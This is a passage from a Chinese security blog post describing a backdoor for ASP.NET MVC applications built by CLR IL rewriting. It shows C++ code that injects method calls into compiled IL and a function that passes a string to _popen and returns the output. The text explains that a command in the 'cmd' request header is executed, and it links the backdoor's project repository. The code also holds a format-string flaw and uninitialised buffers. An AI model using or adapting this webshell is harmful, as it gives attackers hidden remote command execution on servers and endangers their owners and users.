    IfFailRet(metaDataEmit->DefineMemberRef(typeRef1, L"Write", rSig_Write, sizeof(rSig_Write), &MemberRef1));
    
    pNewInstr = pilr->NewILInstr();
    pNewInstr->m_opcode = CEE_CALLVIRT;
    pNewInstr->m_Arg32 = MemberRef1;
    pilr->InsertBefore(pInsertProbeBeforeThisInstr, pNewInstr);
    
    pNewInstr = pilr->NewILInstr();
    pNewInstr->m_opcode = CEE_NOP;
    pilr->InsertBefore(pInsertProbeBeforeThisInstr, pNewInstr);
    

在重写的时候调用函数会用DefineMemberRef来找到对应的函数引用，但因为是本地引用的base对象，所以此处应该要用IMAGE_CEE_CS_CALLCONV_HASTHIS修饰，不然会报对应的方法找不到，这个问题一直困扰了我很久，最后看了很多代码和文库才知道是要这么写-–  
而其中的EnterExecCMD函数是用C++编写的，实现代码如下：

    
    
    static char* STDMETHODCALLTYPE Enter(char* arg0)
    {
        if (arg0 && *arg0 != '\0') {
            int iRet = 0;
            char buf_ps[4096];
            char ps[1024] = { 0 };
            char ret[4096];
            FILE *ptr;
    
            sprintf(ps, arg0);
    
            if ((ptr = _popen(ps, "r")) != NULL)
            {
                while (fgets(buf_ps, sizeof(buf_ps), ptr) != NULL)
                {
                    strcat(ret, buf_ps);
                    if (strlen(ret) > 4096)
                    {
                        break;
                    }
                }
                _pclose(ptr);
                ptr = NULL;
                iRet = 1;  // 处理成功
            }
            else
            {
                iRet = 0; // 处理失败
            }
    
            if (iRet) {
                return buf_ps;
            }
            else {
                return (char*)"Run Command Error";
            }
        }
    }
    

附上最后测试的图，在请求的时候Header头上cmd参数写入要执行的cmd命令即可：

![](https://p2.ssl.qhimg.com/t0108bdf72a5262faf9.png)

最后附上项目地址：<https://gitee.com/leiothrix/aspnetMvcBackdoor>

## Reference

[1].<https://www.cnblogs.com/nly1202/p/5586217.html>  
[2].<https://docs.microsoft.com>

本文翻译自 [原文链接]()。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **Leiothrix** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/256110](/post/id/256110)

安全客 - 有思想的安全新媒体

本文转载自: []()

如若转载,请注明出处： []()

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [webshell](/tag/webshell)
  * [ASP.NET](/tag/ASP.NET)
  * [CLR](/tag/CLR)

 **+1** __0赞

 __收藏

![](https://p0.ssl.qhmsg.com/dm/200_200_100/t0173ff8521ccd1ebdd.jpg) Leiothrix

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

